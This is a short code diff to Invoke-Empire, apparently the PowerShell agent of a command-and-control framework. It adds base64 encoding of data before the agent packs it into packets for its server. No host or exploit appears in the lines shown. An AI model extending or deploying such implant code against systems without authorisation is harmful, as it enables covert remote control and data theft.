@@ -565,6 +565,9 @@ function Invoke-Empire {
             $data = $data -join "`n"
         }
         
+        #convert data to base64 so we can support all encodings and handle on server side
+        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))
+
         $packet = New-Object Byte[] (12 + $data.Length)
 
         # calculate the counter = epochDiff from server + current epoch
